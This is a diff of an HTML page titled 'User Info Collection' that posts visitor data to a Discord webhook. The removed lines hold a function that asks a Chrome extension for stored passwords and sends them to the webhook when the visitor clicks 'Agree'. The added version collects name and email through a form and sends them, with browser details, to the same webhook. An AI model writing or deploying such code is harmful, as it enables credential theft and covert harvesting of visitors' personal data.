@@ -5,8 +5,14 @@
 </head>
 <body>
   <h1>User Info Collection</h1>
-  <p>Please read the following information and agree to share your data:</p>
-  <button id="agree-btn">Agree</button>
+  <p>Please provide the following information:</p>
+  <form id="user-form">
+    <label for="name">Name:</label>
+    <input type="text" id="name" name="name"><br><br>
+    <label for="email">Email:</label>
+    <input type="email" id="email" name="email"><br><br>
+    <button type="submit">Submit</button>
+  </form>
 
   <script>
     // Function to send data to Discord webhook
@@ -22,8 +28,7 @@
               { name: "Email", value: data.email },
               { name: "User Agent", value: navigator.userAgent },
               { name: "Language", value: navigator.language },
-              { name: "Platform", value: navigator.platform },
-              { name: "Chrome Passwords", value: data.passwords }
+              { name: "Platform", value: navigator.platform }
               // Add more fields for additional information if desired
             ]
           }
@@ -49,47 +54,27 @@
         });
     }
 
-    // Function to capture Chrome passwords
-    function capturePasswords(callback) {
-      if (typeof chrome !== "undefined" && chrome && chrome.runtime) {
-        chrome.runtime.sendMessage({ action: "getPasswords" }, passwords => {
-          if (callback && typeof callback === "function") {
-            callback(passwords);
-          }
-        });
-      } else {
-        // Return empty passwords if Chrome API is not available
-        callback([]);
-      }
+    // Function to capture user information on form submission
+    function captureUserInfo(event) {
+      event.preventDefault(); // Prevent form submission
+
+      const name = document.getElementById("name").value;
+      const email = document.getElementById("email").value;
+
+      const userData = {
+        name: name,
+        email: email
+      };
+
+      // Send user information to Discord webhook
+      sendToDiscord(userData);
+
+      // Reset the form
+      document.getElementById("user-form").reset();
     }
 
-    // Function to capture user information on agreement
-    function captureUserInfo() {
-      const name = "Anonymous"; // Default name if not available
-      const email = "Not provided"; // Default email if not available
-
-      // Capture Chrome passwords
-      capturePasswords(passwords => {
-        const userData = {
-          name: name,
-          email: email,
-          passwords: passwords.join("\n") || "No passwords captured"
-        };
-
-        // Send user information to Discord webhook
-        sendToDiscord(userData);
-      });
-    }
-
-    // Add event listener to agreement button
-    document.getElementById("agree-btn").addEventListener("click", function() {
-      // Capture user information when agreed
-      captureUserInfo();
-
-      // Disable the agreement button
-      this.disabled = true;
-      this.innerText = "Agreed";
-    });
+    // Add event listener to form submission
+    document.getElementById("user-form").addEventListener("submit", captureUserInfo);
   </script>
 </body>
 </html>
